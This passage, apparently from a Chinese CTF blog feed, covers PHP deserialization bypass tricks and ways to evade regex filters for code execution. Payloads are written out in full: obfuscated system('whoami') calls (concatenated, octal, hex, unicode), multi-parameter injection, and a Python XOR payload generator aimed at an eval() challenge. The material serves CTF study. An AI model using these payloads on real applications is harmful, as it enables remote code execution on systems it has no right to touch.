class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="利用引用"><a class="markdownIt-Anchor" href="#利用引用">#</a> 利用引用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure><p>上面这个例子将 <code>$b</code>  设置为 <code>$a</code>  的引用，可以使 <code>$a</code>  永远与 <code>$b</code>  相等</p><h4 id="16进制绕过字符的过滤"><a class="markdownIt-Anchor" href="#16进制绕过字符的过滤">#</a> 16 进制绕过字符的过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br></pre></td></tr></table></figure><p>这里给出一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h4 id="php反序列化字符逃逸"><a class="markdownIt-Anchor" href="#php反序列化字符逃逸">#</a> PHP 反序列化字符逃逸</h4><h5 id="情况1过滤后字符变多"><a class="markdownIt-Anchor" href="#情况1过滤后字符变多">#</a> 情况 1：过滤后字符变多</h5><p>首先给出本地的 php 代码，很简单不做过多的解释，就是把反序列化后的一个 x 替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则绕过</title>
      <link href="/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
      <url>/2023/11/12/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="代码执行函数"><a class="markdownIt-Anchor" href="#代码执行函数">#</a> <strong>代码执行函数</strong></h2><p>首先</p><p><strong>eval()</strong></p><p>最常见的代码执行函数 把字符串 code 作为 PHP 代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><p>检测一个断言是否为 <strong>false</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p><code>assert()</code>  会检查指定的 <code>assertion</code>  并在结果为 <code>false</code>  时采取适当的行动。在 <code>PHP5</code>  或 <code>PHP7</code>  中，如果 <code>assertion</code>  是字符串，它将会被 <code>assert()</code>  当做 <code>PHP</code>  代码来执行。</p><p><strong>preg_replace()+/e</strong></p><p>执行一个正则表达式的搜索和替换（一般用来）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>搜索 <code>subject</code>  中匹配 <code>pattern</code>  的部分，以 <code>replacement</code>  进行替换。如果 <code>pattern</code>  的模式修饰符使用 <code>/e</code> ，那么当 <code>subject</code>  被匹配成功时， <code>replacement</code>  会被当做 PHP 代码执行</p><blockquote><p><strong>PS：  <code>preg_replace()+</code>  函数的 <code>/e</code>  修饰符在 <code>PHP7</code>  中被移除</strong></p></blockquote><p><strong>create_function()</strong></p><p>创建一个匿名 (lambda 样式) 函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造 payload 传递给 <code>create_function()</code>  对 <code>参数或函数体</code> <br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102205746960.png?raw=true" alt="在这里插入图片描述"></p><h2 id="可回调函数"><a class="markdownIt-Anchor" href="#可回调函数">#</a> <strong>可回调函数</strong></h2><p><strong>array_map()</strong></p><p>为数组的每个元素应用回调函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array</span> , <span class="keyword">array</span> ...<span class="variable">$arrays</span> ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>返回数组，是为 <code>array</code>  每个元素应用 <code>callback</code>  函数之后的数组。  <code>array_map()</code>  返回一个 <code>array</code> ，数组内容为 <code>array1</code>  的元素按索引顺序为参数调用 <code>callback</code>  后的结果（有更多数组时，还会传入 <code>arrays</code>  的元素）。  <code>callback</code>  函数形参的数量必须匹配 <code>array_map()</code>  实参中数组的数量。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021010221241094.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func()</strong></p><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 <code>callback</code>  是被调用的回调函数，其余参数是回调函数的参数。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102215723117.png?raw=true" alt="在这里插入图片描述"></p><p><strong>call_user_func_array()</strong></p><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>把第一个参数作为回调函数 <code>callback</code>  调用，把参数数组作 <code>param_arr</code>  为回调函数的的参数传入。跟 <code>array_map()</code>  相似</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220152139.png?raw=true" alt="在这里插入图片描述"></p><p><strong>array_filter()</strong></p><p>用回调函数过滤数组中的单元</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>依次将 <code>array</code>  数组中的每个值传递到 <code>callback</code>  函数。如果 <code>callback</code>  函数返回 <code>true</code> ，则 <code>array</code>  数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210102220700697.png?raw=true" alt="在这里插入图片描述"></p><p><strong>usort()</strong></p><p>使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span> ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">callable</span> <span class="variable">$value_compare_func</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>当 <code>PHP &lt; 5.6</code>  时</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103123448401.png?raw=true" alt="在这里插入图片描述"></p><p>当 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时，php 有一个 <code>参数变长</code> 特性</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103205857483.png?raw=true" alt="在这里插入图片描述"></p><h2 id="字符串拼接绕过"><a class="markdownIt-Anchor" href="#字符串拼接绕过">#</a> <strong>字符串拼接绕过</strong></h2><p>字符串拼接绕过适用于过滤具体关键字的限制</p><p>使用 PHP &gt;=7</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210103225920322.png?raw=true" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><blockquote><p>在 PHP 中不一定需要 <code>引号(单引号/双引号)</code>  来表示字符串。PHP 支持我们声明元素的类型，比如 <code>$name = (string)mochu7;</code> ，在这种情况下， <code>$name</code>  就包含字符串 <code>&quot;mochu7&quot;</code> ，此外，如果不显示声明类型，那么 PHP 会将 <code>圆括号内的数据当成字符串</code> 来处理</p></blockquote><h2 id="字符串转义绕过"><a class="markdownIt-Anchor" href="#字符串转义绕过">#</a> <strong>字符串转义绕过</strong></h2><p>适用版本 PHP&gt;=7</p><p>以八进制表示的 <code>\[0–7]&#123;1,3&#125;</code>  转义字符会自动适配 byte（如 <code>&quot;\400&quot; == “\000”</code> ）<br>以十六进制的 <code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>  转义字符表示法（如 <code>“\x41&quot;</code> ）<br>以 Unicode 表示的 <code>\u&#123;[0–9A-Fa-f]+&#125;</code>  字符，会输出为 UTF-8 字符串</p><p>payload 处理脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">hex_payload(payload)</span><br><span class="line">oct_payload(payload)</span><br><span class="line">uni_payload(payload)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;</span>();<span class="comment">#phpinfo();</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;</span>(<span class="string">&#x27;id&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104173537720.png?raw=true" alt="在这里插入图片描述"></p><p>另外，八进制的方法可以绕过 <code>无字母传参</code> 进行代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104180029425.png?raw=true" alt="在这里插入图片描述"></p><h2 id="多次传参绕过"><a class="markdownIt-Anchor" href="#多次传参绕过">#</a> <strong>多次传参绕过</strong></h2><p>如果过滤了 <code>引号(单引号/双引号)</code> ，可以通过以下方法绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104185804485.png?raw=true" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?<span class="number">1</span>=system&amp;<span class="number">2</span>=whoami</span><br><span class="line">POST:</span><br><span class="line">cmd=<span class="variable">$_GET</span>[<span class="number">1</span>](<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>如果 <code>PHP版本大于7</code>  这里还可以用拼接的方法绕过过滤引号</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(sy.st.em)(whoami);</span><br></pre></td></tr></table></figure><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104203723764.png?raw=true" alt="在这里插入图片描述"></p><p>回调函数可能大部分看限制的具体长度，但是在 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时对以上过滤方法可以绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104211408314.png?raw=true" alt="在这里插入图片描述"></p><h2 id="内置函数访问绕过"><a class="markdownIt-Anchor" href="#内置函数访问绕过">#</a> 内置函数访问绕过</h2><p><code>get_defined_functions()</code> ：返回所有已定义函数的数组</p><p>利用这种方法首先还需要知道 PHP 的具体版本，因为每个版本的 <code>get_defined_functions()</code>  返回的值都是不一样的，这里以 <code>php7.4.3</code>  为准</p><p><img src="https://img-blog.csdnimg.cn/20210104224616126.png" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225436558.png?raw=true" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225532878.png?raw=true" alt="在这里插入图片描述"></p><h2 id="异或过滤"><a class="markdownIt-Anchor" href="#异或过滤">#</a> <strong>异或过滤</strong></h2><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或  <code>?</code>  和  <code>~</code>  之后得到的是  <code>A</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure><p>接下来看一道例题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了 <code>所有英文字母和数字</code> ，但是我们知道 ASCII 码中还有很多 <code>字母数字之外的字符</code> ，利用这些字符进行异或可以得到我们想要的字符</p><blockquote><p>PS：取 ASCII 表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p></blockquote><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td 